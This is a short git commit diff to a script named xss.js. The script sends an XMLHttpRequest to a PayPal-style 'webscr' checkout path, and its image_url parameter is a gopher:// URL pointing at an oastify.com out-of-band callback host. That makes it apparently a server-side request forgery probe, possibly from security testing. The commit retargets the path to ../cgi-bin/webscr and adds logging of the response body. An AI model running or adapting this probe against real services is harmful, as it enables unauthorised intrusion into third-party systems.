dd8da290b2af7b725b319e1d3b03a145b27e6728
taharbenaissadz <86470355+taharbenaissadz@users.noreply.github.com>
2023-02-02 12:56:13 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,9 +1,10 @@
-const url = "./webscr?address1=sectesting&address2=sectesting02&address_override=true&business=anders@andersnoren.se&cmd=_xclick&xo_node_fallback=true&force_sa=true&image_url=gopher://jvioinl7vikpd5253p0mgztb72dx1m.oastify.com/hfg?ghg.jpg";
+const url = "../cgi-bin/webscr?address1=sectesting&address2=sectesting02&address_override=true&business=anders@andersnoren.se&cmd=_xclick&xo_node_fallback=true&force_sa=true&image_url=gopher://jvioinl7vikpd5253p0mgztb72dx1m.oastify.com/hfg?ghg.jpg";
 let xml = new XMLHttpRequest();
 xml.onreadystatechange = function(){
     if(xml.readyState !== 4) return;
     if(xml.status === 200){
         console.log("ok");
+        console.log(xml.responseText);
     }
 }
 xml.open("GET",url);
